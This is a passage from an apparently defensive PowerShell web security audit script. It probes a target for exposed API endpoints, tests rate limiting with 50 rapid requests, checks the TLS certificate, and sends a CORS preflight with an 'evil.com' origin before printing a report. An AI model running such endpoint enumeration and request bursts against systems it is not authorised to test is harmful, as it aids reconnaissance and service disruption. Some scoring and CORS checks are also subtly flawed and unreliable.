                -Status "SECURE" -Severity "INFO"
        }
    }
} catch {
    Write-Log "Session test failed: $($_.Exception.Message)" -Level DEBUG
}
#endregion

#region Phase 4: API Security
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 4: API SECURITY" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 4: API Security" -Console

# Test 8: API Endpoint Discovery
Write-Host "`n[4.1] Discovering API Endpoints..." -ForegroundColor Gray
$apiEndpoints = @(
    "/api", "/api/v1", "/api/v2", "/api/users", "/api/admin", "/api/config",
    "/api/auth", "/api/token", "/api/data", "/api/database", "/graphql", 
    "/graphiql", "/rest", "/v1", "/v2"
)
$accessibleEndpoints = @()

foreach($endpoint in $apiEndpoints) {
    try {
        $result = Test-Endpoint -Url "$TargetURL$endpoint"
        if ($result[0]) {
            $accessibleEndpoints += $endpoint
            Write-Log "API endpoint accessible: $endpoint" -Level INFO
        }
    } catch {
        Write-Log "API endpoint check failed: $endpoint" -Level DEBUG
    }
}

if($accessibleEndpoints.Count -gt 0) {
    Add-TestResult -Category "API" -TestName "Endpoint Exposure" `
        -Details "$($accessibleEndpoints.Count) API endpoints accessible without auth" `
        -Status "VULNERABLE" -Severity "HIGH" `
        -Recommendation "Implement authentication for all API endpoints" `
        -CWE "CWE-306" `
        -Remediation "Require authentication tokens for all API endpoints" `
        -Evidence $accessibleEndpoints
} else {
    Add-TestResult -Category "API" -TestName "Endpoint Exposure" `
        -Details "No unprotected API endpoints found" `
        -Status "SECURE" -Severity "INFO"
}

# Test 9: Rate Limiting Test
if (-not $SkipDOSCheck) {
    Write-Host "`n[4.2] Testing Rate Limiting..." -ForegroundColor Gray
    $requests = 50
    $successCount = 0
    for ($i = 1; $i -le $requests; $i++) {
        try {
            $result = Invoke-SafeRequest -Uri "$TargetURL/"
            if ($result.Success) {
                $successCount++
            }
            Start-Sleep -Milliseconds 100
        } catch {
            # Rate limiting might cause errors
        }
    }
    
    if ($successCount -eq $requests) {
        Add-TestResult -Category "Availability" -TestName "Rate Limiting" `
            -Details "No rate limiting detected on $requests rapid requests" `
            -Status "WARNING" -Severity "MEDIUM" `
            -Recommendation "Implement rate limiting to prevent DoS attacks" `
            -CWE "CWE-770"
    } else {
        Add-TestResult -Category "Availability" -TestName "Rate Limiting" `
            -Details "Rate limiting appears to be in place" `
            -Status "SECURE" -Severity "INFO"
    }
}
#endregion

#region Phase 5: Advanced Tests
# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Magenta
Write-Host "PHASE 5: ADVANCED TESTS" -ForegroundColor Magenta
Write-Host "############################################################" -ForegroundColor Magenta

Write-Log "Starting Phase 5: Advanced Tests" -Console

# Test 10: SSL/TLS Configuration (if HTTPS)
if ($TargetURL.StartsWith("https://")) {
    Write-Host "`n[5.1] Testing SSL/TLS Configuration..." -ForegroundColor Gray
    try {
        # Simple SSL check - in production, use proper SSL testing tools
        $uri = [System.Uri]$TargetURL
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($uri.Host, 443)
        $sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream())
        $sslStream.AuthenticateAsClient($uri.Host)
        $certificate = $sslStream.RemoteCertificate
        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certificate)
        
        $sslInfo = @{
            Issuer = $cert.Issuer
            Subject = $cert.Subject
            Expiration = $cert.NotAfter
            DaysUntilExpiry = ($cert.NotAfter - (Get-Date)).Days
            Algorithm = $cert.SignatureAlgorithm.FriendlyName
        }
        
        if ($sslInfo.DaysUntilExpiry -lt 30) {
            Add-TestResult -Category "Cryptography" -TestName "SSL Certificate" `
                -Details "Certificate expires in $($sslInfo.DaysUntilExpiry) days" `
                -Status "WARNING" -Severity "MEDIUM" `
                -Recommendation "Renew SSL certificate" `
                -Evidence $sslInfo
        } else {
            Add-TestResult -Category "Cryptography" -TestName "SSL Certificate" `
                -Details "Certificate valid for $($sslInfo.DaysUntilExpiry) days" `
                -Status "SECURE" -Severity "INFO"
        }
        $sslStream.Close()
        $tcpClient.Close()
    } catch {
        Add-TestResult -Category "Cryptography" -TestName "SSL Certificate" `
            -Details "SSL test failed: $($_.Exception.Message)" `
            -Status "ERROR" -Severity "INFO"
    }
}

# Test 11: CORS Misconfiguration
Write-Host "`n[5.2] Testing CORS Configuration..." -ForegroundColor Gray
try {
    $corsHeaders = @{
        "Origin" = "https://evil.com"
        "Access-Control-Request-Method" = "POST"
    }
    $result = Invoke-SafeRequest -Uri $TargetURL -Method "OPTIONS" -Headers $corsHeaders -ReturnResponse
    
    if ($result.Success) {
        $responseHeaders = $result.Response.Headers
        $corsHeadersFound = @()
        
        if ($responseHeaders["Access-Control-Allow-Origin"] -eq "*") {
            $corsHeadersFound += "Access-Control-Allow-Origin: * (Too permissive)"
        }
        if ($responseHeaders["Access-Control-Allow-Credentials"] -eq "true" -and $responseHeaders["Access-Control-Allow-Origin"] -eq "*") {
            $corsHeadersFound += "Dangerous combination: Allow-Credentials=true with wildcard origin"
        }
        
        if ($corsHeadersFound.Count -gt 0) {
            Add-TestResult -Category "CORS" -TestName "CORS Misconfiguration" `
                -Details "Potentially dangerous CORS configuration" `
                -Status "VULNERABLE" -Severity "MEDIUM" `
                -Recommendation "Restrict CORS origins to trusted domains only" `
                -CWE "CWE-942" `
                -Evidence $corsHeadersFound
        } else {
            Add-TestResult -Category "CORS" -TestName "CORS Configuration" `
                -Details "CORS properly configured" `
                -Status "SECURE" -Severity "INFO"
        }
    }
} catch {
    Write-Log "CORS test failed: $($_.Exception.Message)" -Level DEBUG
}
#endregion

#region Reporting

# Stop stopwatch and calculate final stats
$global:stats.ExecutionTime.Stop()
$executionTime = $global:stats.ExecutionTime.Elapsed
$executionMinutes = [System.Math]::Round($executionTime.TotalMinutes, 2)
$totalTests = $global:stats.TotalTests
$totalVulnerabilities = $global:vulnerabilities.Count
$totalWarnings = $global:warnings.Count
$totalSecure = ($global:results | Where-Object { $_.Status -eq "SECURE" }).Count
$totalInfo = ($global:results | Where-Object { $_.Status -eq "INFO" }).Count
$totalErrors = ($global:results | Where-Object { $_.Status -eq "ERROR" }).Count

# Calculate security percentage (VULNERABLE counts as 0, WARNING counts as 50%)
$securityPercentage = [System.Math]::Round(($totalSecure + $totalWarnings/2) / $totalTests * 100, 0)
if ($totalTests -eq 0) { $securityPercentage = 100 }

# Generate Reports
Write-Host "`n[REPORTS] Generating reports..." -ForegroundColor Cyan
$txtReportPath = New-TxtReport -Path (Join-Path $directories.Reports "summary_$timestamp.txt")
$htmlReportPath = New-HtmlReport -Path (Join-Path $directories.Reports "report_$timestamp.html")
$jsonReportPath = New-JsonReport -Path (Join-Path $directories.Reports "data_$timestamp.json")
$csvReportPath = New-CsvReport -Path (Join-Path $directories.Reports "results_$timestamp.csv")
Write-Host "v Reports generated successfully." -ForegroundColor Green


#endregion

#region Final Output
# CORREÇÃO: Substituindo caracteres de desenho de caixa e emojis por ASCII e corrigindo erros de parsing.
Write-Host "`n############################################################" -ForegroundColor Green
Write-Host "AUDIT COMPLETED SUCCESSFULLY" -ForegroundColor Green
Write-Host "############################################################" -ForegroundColor Green

# Pre-calcula strings formatadas
$totalTestsPadded = $global:stats.TotalTests.ToString().PadLeft(10)
$totalRequestsPadded = $global:stats.TotalRequests.ToString().PadLeft(10)
$executionMinutesPadded = $executionMinutes.ToString().PadLeft(8)
$securityPercentagePadded = $securityPercentage.ToString().PadLeft(7)

# CORREÇÃO DE TAMANHO: Garante que os nomes de arquivo se encaixem no tamanho da tabela (25 caracteres)
$txtFileName = (Split-Path -Path $txtReportPath -Leaf).PadRight(25)
$htmlFileName = (Split-Path -Path $htmlReportPath -Leaf).PadRight(25)
$jsonFileName = (Split-Path -Path $jsonReportPath -Leaf).PadRight(25)
$csvFileName = (Split-Path -Path $csvReportPath -Leaf).PadRight(25)
$evidenceTextPadded = "evidence\ (multiple files)".PadRight(25)
$logFileName = (Split-Path -Path $logFile -Leaf).PadRight(25)

# FIX PRINCIPAL: Usando parênteses para forçar a avaliação do operador -f

Write-Host "`n## FINAL STATISTICS ##" -ForegroundColor Cyan
Write-Host "   +-------------------------------------+" -ForegroundColor Cyan

# Usa o operador -f dentro de parênteses para formatação segura
Write-Host ("   | Total Tests:        {0} |" -f $totalTestsPadded) -ForegroundColor White
Write-Host ("   | Total Requests:     {0} |" -f $totalRequestsPadded) -ForegroundColor White
Write-Host ("   | Execution Time:     {0} min |" -f $executionMinutesPadded) -ForegroundColor White
Write-Host ("   | Security Score:     {0}% |" -f $securityPercentagePadded) -ForegroundColor White
Write-Host "   +-------------------------------------+" -ForegroundColor Cyan

# FIX: Removendo Unicode
Write-Host "`n## SECURITY ASSESSMENT ##" -ForegroundColor Cyan
$color = if ($securityPercentage -ge 80) { "Green" } 
         elseif ($securityPercentage -ge 60) { "Yellow" } 
         else { "Red" }
Write-Host "   Risk Level: " -NoNewline -ForegroundColor Cyan
Write-Host $(if ($securityPercentage -ge 80) { "LOW" } 
             elseif ($securityPercentage -ge 60) { "MEDIUM" } 
             else { "HIGH" }) -ForegroundColor $color

# FIX: Removendo Unicode
Write-Host "`n## FINDINGS BREAKDOWN ##" -ForegroundColor Cyan
Write-Host "   v Secure:         $totalSecure" -ForegroundColor Green
Write-Host "   ! Warnings:       $totalWarnings" -ForegroundColor Yellow
Write-Host "   x Vulnerabilities:$totalVulnerabilities" -ForegroundColor Red
Write-Host "   i Informational:  $totalInfo" -ForegroundColor Cyan
Write-Host "   e Errors:         $totalErrors" -ForegroundColor Magenta

if ($totalVulnerabilities -gt 0) {
    $criticalCount = ($global:vulnerabilities | Where-Object { $_.Severity -eq "CRITICAL" }).Count
    $highCount = ($global:vulnerabilities | Where-Object { $_.Severity -eq "HIGH" }).Count
    
    if ($criticalCount -gt 0) {
        Write-Host "`n! CRITICAL ALERT: $criticalCount critical vulnerabilities found!" -ForegroundColor Red -BackgroundColor Black
        Write-Host "   Immediate remediation required!" -ForegroundColor Red
    }
    
    if ($highCount -gt 0) {
        Write-Host "   ! HIGH PRIORITY: $highCount high severity issues require attention" -ForegroundColor Yellow
    }
} elseif ($totalWarnings -gt 0) {
    Write-Host "`n! WARNING: $totalWarnings issues require attention" -ForegroundColor Yellow
} else {
    Write-Host "`nv EXCELLENT: System shows strong security posture" -ForegroundColor Green
}

# FIX PRINCIPAL: Usando parênteses para forçar a avaliação do operador -f e corrigindo a linha EVIDENCE
Write-Host "`n## REPORTS GENERATED ##" -ForegroundColor Cyan
Write-Host "   +---------------------------------------------------------+" -ForegroundColor Cyan

# Usa o operador -f dentro de parênteses para formatação segura
Write-Host ("   | [ ] Executive Summary: {0} |" -f $txtFileName) -ForegroundColor White
Write-Host ("   | [ ] HTML Report:       {0} |" -f $htmlFileName) -ForegroundColor White
Write-Host ("   | [ ] JSON Data:         {0} |" -f $jsonFileName) -ForegroundColor White
Write-Host ("   | [ ] CSV Results:       {0} |" -f $csvFileName) -ForegroundColor White
# CORREÇÃO DA LINHA PROBLEMÁTICA: Usando -f para garantir a sintaxe correta
$evidencePadded = "evidence\ (multiple files)".PadRight(25)
Write-Host ("   | [ ] Evidence:          {0} |" -f $evidencePadded) -ForegroundColor White 
Write-Host ("   | [ ] Logs:              {0} |" -f $logFileName) -ForegroundColor White 
Write-Host "   +---------------------------------------------------------+" -ForegroundColor Cyan

# FIX: Removendo Unicode
Write-Host "`n[DIRECTORY] Audit Directory: $baseDir" -ForegroundColor White

# Try to open reports
try {
    # FIX: Removendo Unicode
    Write-Host "`n--> Opening reports..." -ForegroundColor Cyan
    Start-Process $htmlReportPath
    Start-Process $directories.Reports
    # FIX: Removendo Unicode
    Write-Host "v Reports opened successfully" -ForegroundColor Green 
} catch {
    # FIX: Removendo Unicode
    Write-Host "!! Could not open reports automatically. Check $baseDir" -ForegroundColor Yellow 
}

# CORREÇÃO: Substituindo caracteres de desenho de caixa por ASCII
Write-Host "`n############################################################" -ForegroundColor Cyan
Write-Host "SECURITY AUDIT COMPLETE - $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Cyan
Write-Host "############################################################" -ForegroundColor Cyan
Write-Host "`n"
#endregion